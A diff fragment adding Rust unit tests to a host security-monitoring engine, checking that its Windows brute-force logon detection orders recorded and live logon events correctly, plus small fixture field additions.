+                .unwrap()
+                .user
+                .as_deref(),
+            Some("corp\\alice")
+        );
+        assert!(det_of(finding)
+            .correlation
+            .as_ref()
+            .unwrap()
+            .process_key
+            .is_none());
+    }
+
+    #[test]
+    fn recorded_logons_accept_equal_timestamps_and_do_not_mix_live_failures() {
+        let e = engine();
+        let receipt = Instant::now();
+        for _ in 0..2 {
+            e.inspect_at(&audit_logon_at(false, 100), receipt, 0.0);
+        }
+        let mut live_failure = audit_logon_at(false, 0);
+        live_failure.origin.as_mut().unwrap().source = Some("windows_process_poll".into());
+        e.inspect_at(&live_failure, receipt, 0.0);
+        assert!(
+            e.inspect_at(&audit_logon_at(true, 100), receipt, 0.0)
+                .is_empty(),
+            "two recorded failures must not borrow a live failure"
+        );
+        // Equal event timestamps are common in the same Security batch.
+        e.inspect_at(&audit_logon_at(false, 100), receipt, 0.0);
+        assert!(find(
+            &e.inspect_at(&audit_logon_at(true, 100), receipt, 0.0),
+            "auth.windows_bruteforce_success"
+        )
+        .is_some());
+    }
+
+    #[test]
+    fn recorded_logon_watermark_rejects_older_records_without_affecting_live_history() {
+        let e = engine();
+        let receipt = Instant::now();
+        for i in 0..3 {
+            e.inspect_at(&audit_logon_at(false, 100 + i), receipt, 0.0);
+        }
+        assert!(
+            e.inspect_at(&audit_logon_at(true, 99), receipt, 0.0)
+                .is_empty(),
+            "later failures cannot justify an earlier successful logon"
+        );
+        assert!(find(
+            &e.inspect_at(&audit_logon_at(true, 103), receipt, 0.0),
+            "auth.windows_bruteforce_success"
+        )
+        .is_some());
+        for i in 0..3 {
+            let mut live = audit_logon_at(false, i);
+            live.origin.as_mut().unwrap().source = Some("windows_process_poll".into());
+            e.inspect_at(&live, receipt, i as f64);
+        }
+        let mut success = audit_logon_at(true, 3);
+        success.origin.as_mut().unwrap().source = Some("windows_process_poll".into());
+        assert!(
+            find(
+                &e.inspect_at(&success, receipt, 3.0),
+                "auth.windows_bruteforce_success"
+            )
+            .is_some(),
+            "recorded UTC watermark must not discard live elapsed-time events"
+        );
     }
 
     fn find<'a>(out: &'a [AgentEvent], rule: &str) -> Option<&'a AgentEvent> {
@@ -2469,6 +3177,9 @@ mod tests {
                 client_addr: "10.0.0.2".into(),
                 transaction_id: 1,
                 rcode: "NOERROR".into(),
+                pid: None,
+                process: None,
+                process_start_time: None,
             }),
         );
         let out = e.inspect(&res);
@@ -2650,6 +3361,7 @@ mod tests {
                     src_port: None,
                     auth_method: Some("password".into()),
                     success: ok,
+                    ..Default::default()
                 }),
             )
         };
